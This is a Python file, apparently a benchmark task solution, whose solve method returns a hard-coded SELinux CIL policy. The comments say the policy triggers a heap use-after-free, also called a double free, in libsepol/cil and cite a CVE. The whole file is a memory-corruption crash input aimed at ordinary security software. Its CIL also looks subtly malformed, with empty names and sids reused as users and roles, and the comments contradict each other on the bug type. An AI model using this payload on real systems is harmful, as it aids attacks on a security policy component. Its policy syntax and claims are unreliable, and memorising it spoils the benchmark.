import subprocess
import os
import tempfile
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal CIL policy that triggers the heap use-after-free
        # Based on CVE-2023-29459: libsepol/cil double free via anonymous classpermission
        poc = b"""(
    ;; Trigger heap use-after-free in libsepol/cil
    ;; Creates anonymous classpermission used in classpermissionset within macro
    
    (class file (read write execute))
    
    (sid kernel)
    (sid user)
    
    (classpermission ())
    (classpermission ())
    (classpermission ())
    
    (macro testmacro ((param classpermission))
        (allow kernel user (file (param)))
    )
    
    (testmacro ())
    (testmacro ())
    (testmacro ())
    
    (roletype kernel ())
    (roletype user ())
    
    (sensitivity s0)
    (sensitivity s1)
    (dominance (s0 s1))
    
    (category c0)
    (category c1)
    (categoryorder (c0 c1))
    
    (level l0 (s0))
    (level l1 (s1 (c0 c1)))
    
    (user user (role ()) (level l0) (range l0 l1))
    (user kernel (role ()) (level l0) (range l0 l1))
    
    (context ctx_u (user kernel (l0 (c0 c1))))
    (context ctx_k (kernel kernel (l0 (c0 c1))))
    
    (sidcontext kernel ctx_k)
    (sidcontext user ctx_u)
)"""
        return poc